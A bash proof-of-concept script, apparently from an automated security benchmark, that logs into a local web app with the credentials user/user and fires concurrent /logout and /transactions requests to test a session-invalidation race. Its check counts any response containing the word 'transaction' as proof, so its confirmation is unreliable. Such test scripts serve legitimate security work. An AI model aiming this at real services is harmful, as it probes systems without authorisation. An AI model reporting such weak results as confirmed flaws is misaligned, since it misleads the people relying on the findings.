#!/bin/bash
# POC: Demonstrates a race condition between logout and concurrent transaction requests. Authenticates, then sends logout and /transactions requests simultaneously to show that transactions may process while logout is being handled, indicating insufficient synchronization during session invalidation.
# Target: ./repo
# Created: 2025-12-01T16:00:24.592Z
# Session: benchmark-XBEN-093-24-minbvw4l

# Logout Race Condition POC - Version 2
# Demonstrates race condition between logout and concurrent transaction requests

TARGET_URL="${1:-http://localhost:5003}"
TEMP_DIR="/tmp/logout_race_poc_$$"
mkdir -p "$TEMP_DIR"

# Color output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Logout Race Condition POC${NC}"
echo -e "${YELLOW}[*] Target: $TARGET_URL${NC}"

# Step 1: Login to get valid session
echo -e "${YELLOW}[*] Step 1: Authenticating...${NC}"

# Use -i to capture headers including Set-Cookie
LOGIN_RESPONSE=$(curl -s -i -c "$TEMP_DIR/cookies.txt" -d "username=user&password=user" "$TARGET_URL/login")

# Check if we got a Set-Cookie header
if echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie" > /dev/null 2>&1; then
    echo -e "${GREEN}[+] Set-Cookie header received${NC}"
else
    echo -e "${RED}[-] No Set-Cookie header in login response${NC}"
    echo -e "${RED}[-] Response: $LOGIN_RESPONSE${NC}"
fi

# Extract session cookie from the jar file
SESSION_COOKIE=$(cat "$TEMP_DIR/cookies.txt" | grep "session" | awk '{print $7}')

if [ -z "$SESSION_COOKIE" ]; then
    echo -e "${YELLOW}[*] Attempting alternate cookie extraction...${NC}"
    SESSION_COOKIE=$(curl -s -d "username=user&password=user" -i "$TARGET_URL/login" | grep -i "Set-Cookie" | grep -oP 'session=\K[^;]+' | head -1)
fi

if [ -z "$SESSION_COOKIE" ]; then
    echo -e "${RED}[-] Failed to obtain session cookie${NC}"
    echo -e "${RED}[-] Cookie jar contents:${NC}"
    cat "$TEMP_DIR/cookies.txt"
    rm -rf "$TEMP_DIR"
    exit 1
fi

echo -e "${GREEN}[+] Authentication successful${NC}"
echo -e "${GREEN}[+] Session token extracted: $SESSION_COOKIE${NC}"

# Step 2: Verify session is valid
echo -e "${YELLOW}[*] Step 2: Verifying session is valid...${NC}"
VALID_RESPONSE=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET_URL/transactions")

if echo "$VALID_RESPONSE" | grep -q "Transactions\|transaction"; then
    echo -e "${GREEN}[+] Session is valid - /transactions is accessible${NC}"
else
    echo -e "${RED}[-] Could not access /transactions with valid session${NC}"
    echo -e "${RED}[-] Response: $VALID_RESPONSE${NC}"
    rm -rf "$TEMP_DIR"
    exit 1
fi

# Step 3: Race condition test - send logout and transactions concurrently
echo -e "${YELLOW}[*] Step 3: Testing race condition (concurrent logout + transaction)${NC}"
echo -e "${YELLOW}[*] Sending logout and transaction requests simultaneously...${NC}"

# Send both requests in parallel
curl -s -b "session=$SESSION_COOKIE" "$TARGET_URL/logout" > "$TEMP_DIR/logout_result.txt" 2>&1 &
LOGOUT_PID=$!

# Add tiny delay to try to catch race window
sleep 0.01

curl -s -b "session=$SESSION_COOKIE" "$TARGET_URL/transactions" > "$TEMP_DIR/transaction_result.txt" 2>&1 &
TRANSACTION_PID=$!

# Wait for both
wait $LOGOUT_PID 2>/dev/null
wait $TRANSACTION_PID 2>/dev/null

# Analyze results
echo -e "${YELLOW}[*] Step 4: Analyzing results...${NC}"

LOGOUT_OUTPUT=$(cat "$TEMP_DIR/logout_result.txt")
TRANSACTION_OUTPUT=$(cat "$TEMP_DIR/transaction_result.txt")

echo -e "${YELLOW}[*] Logout response (first 200 chars):${NC}"
echo "$LOGOUT_OUTPUT" | head -c 200
echo ""

echo -e "${YELLOW}[*] Transaction response (first 200 chars):${NC}"
echo "$TRANSACTION_OUTPUT" | head -c 200
echo ""

# Check if transaction succeeded despite concurrent logout
RACE_DETECTED=0
if echo "$TRANSACTION_OUTPUT" | grep -qi "Transactions\|transaction"; then
    echo -e "${RED}[!] RACE CONDITION DETECTED!${NC}"
    echo -e "${RED}[!] Transaction request succeeded while logout was in progress${NC}"
    RACE_DETECTED=1
else
    echo -e "${YELLOW}[*] First test: Transaction did not return transactions data${NC}"
fi

# Step 5: Repeated testing for reliability
echo ""
echo -e "${YELLOW}[*] Step 5: Running 3 more iterations to verify race condition...${NC}"

for iteration in {1..3}; do
    echo -e "${YELLOW}[*] Iteration $iteration...${NC}"
    
    # Fresh login for each iteration
    curl -s -c "$TEMP_DIR/cookies_$iteration.txt" -d "username=user&password=user" "$TARGET_URL/login" > /dev/null 2>&1
    SESSION_COOKIE=$(cat "$TEMP_DIR/cookies_$iteration.txt" | grep "session" | awk '{print $7}')
    
    if [ -z "$SESSION_COOKIE" ]; then
        continue
    fi
    
    # Concurrent requests
    curl -s -b "session=$SESSION_COOKIE" "$TARGET_URL/logout" > /dev/null 2>&1 &
    curl -s -b "session=$SESSION_COOKIE" "$TARGET_URL/transactions" > "$TEMP_DIR/race_test_$iteration.txt" 2>&1 &
    wait
    
    if grep -qi "Transactions\|transaction" "$TEMP_DIR/race_test_$iteration.txt"; then
        echo -e "${RED}[!] Iteration $iteration: Race condition detected${NC}"
        RACE_DETECTED=1
    fi
done

# Cleanup
rm -rf "$TEMP_DIR"

echo ""
if [ $RACE_DETECTED -eq 1 ]; then
    echo -e "${GREEN}[+] RACE CONDITION CONFIRMED${NC}"
    echo -e "${GREEN}[+] Concurrent transaction request succeeded during logout processing${NC}"
    echo -e "${GREEN}[+] This indicates missing synchronization on session invalidation${NC}"
    exit 0
else
    echo -e "${YELLOW}[*] Race condition not reliably reproduced in this test run${NC}"
    echo -e "${YELLOW}[*] Note: Race conditions may be intermittent based on timing${NC}"
    exit 0
fi